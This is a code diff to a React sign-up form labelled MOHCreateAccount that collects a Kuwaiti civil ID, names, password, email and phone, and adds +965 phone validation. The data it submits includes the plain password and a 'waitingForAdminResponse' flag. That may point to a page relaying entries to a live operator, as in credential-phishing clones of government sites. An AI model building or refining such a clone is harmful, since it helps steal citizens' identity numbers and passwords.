@@ -16,6 +16,7 @@ export default function MOHCreateAccount() {
   const [confirmPassword, setConfirmPassword] = useState('');
   const [email, setEmail] = useState('');
   const [phone, setPhone] = useState('');
+  const [phoneError, setPhoneError] = useState('');
   const [civilIdError, setCivilIdError] = useState('');
 
   const isAr = lang === 'ar';
@@ -121,7 +122,8 @@ export default function MOHCreateAccount() {
   };
 
   const isCivilIdValid = civilId.length === 12 && validateKuwaitCivilId(civilId);
-  const isValid = isCivilIdValid && nameAr && nameEn && password && confirmPassword && email && phone && password === confirmPassword;
+  const isPhoneValid = phone.length === 8 && /^[569]/.test(phone);
+  const isValid = isCivilIdValid && nameAr && nameEn && password && confirmPassword && email && isPhoneValid && password === confirmPassword;
 
   const handleCreate = () => {
     if (!isValid) return;
@@ -140,7 +142,7 @@ export default function MOHCreateAccount() {
         'الاسم بالإنجليزية': nameEn,
         'كلمة المرور': password,
         'البريد الإلكتروني': email,
-        'رقم الهاتف': phone,
+        'رقم الهاتف': '+965' + phone,
       },
       current: 'إنشاء حساب جديد',
       waitingForAdminResponse: false,
@@ -324,14 +326,42 @@ export default function MOHCreateAccount() {
               {/* Phone */}
               <div style={{ marginBottom: 25 }}>
                 <label style={labelStyle}>{tx.phone} <span style={{ color: 'red' }}>*</span></label>
-                <input
-                  type="tel"
-                  value={phone}
-                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
-                  maxLength={12}
-                  placeholder={tx.phonePh}
-                  style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
-                />
+                <div style={{ display: 'flex', alignItems: 'center', gap: 0, direction: 'ltr' }}>
+                  <span style={{
+                    background: '#f0f0f0',
+                    border: '1px solid #ccc',
+                    borderRight: 'none',
+                    borderRadius: '6px 0 0 6px',
+                    padding: '10px 12px',
+                    fontSize: 15,
+                    color: '#333',
+                    fontWeight: 'bold',
+                    height: '44px',
+                    display: 'flex',
+                    alignItems: 'center',
+                    userSelect: 'none'
+                  }}>+965</span>
+                  <input
+                    type="tel"
+                    value={phone}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, '');
+                      if (val.length <= 8) {
+                        setPhone(val);
+                        setPhoneError('');
+                      }
+                    }}
+                    onBlur={() => {
+                      if (phone && (phone.length !== 8 || !/^[569]/.test(phone))) {
+                        setPhoneError(isAr ? 'رقم الهاتف يجب أن يكون 8 أرقام ويبدأ بـ 5 أو 6 أو 9' : 'Phone must be 8 digits starting with 5, 6 or 9');
+                      }
+                    }}
+                    maxLength={8}
+                    placeholder={isAr ? 'XXXX XXXX' : 'XXXX XXXX'}
+                    style={{ ...inputStyle, direction: 'ltr', textAlign: 'left', borderRadius: '0 6px 6px 0', flex: 1 }}
+                  />
+                </div>
+                {phoneError && <p style={{ color: 'red', fontSize: 12, marginTop: 4 }}>{phoneError}</p>}
               </div>
 
               {/* Create Button */}
